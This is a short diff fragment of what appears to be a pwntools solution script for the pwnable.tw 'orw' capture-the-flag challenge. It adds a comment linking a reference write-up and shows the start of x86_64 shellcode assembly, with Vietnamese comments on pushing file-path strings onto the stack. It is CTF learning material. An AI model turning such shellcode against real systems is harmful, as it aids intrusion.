@@ -7,6 +7,7 @@ print(u64('.txt\0\0\0\0'))
 print(u64('ongCoDon'))
 print(u64('PhaPhaKh'))
 
+# Reference from hint. Link: https://drx.home.blog/2019/04/03/pwnable-tw-orw/
 # Ban đầu không biết sai gì ở chỗ push, sau đó có đồng đội chỉ lại mới biết x86_64 không push trực tiếp immediate vào stack =3
 shellcode = asm('\n'.join([
         # Đưa các giá trị vào thanh ghi để gián tiếp push vào stack
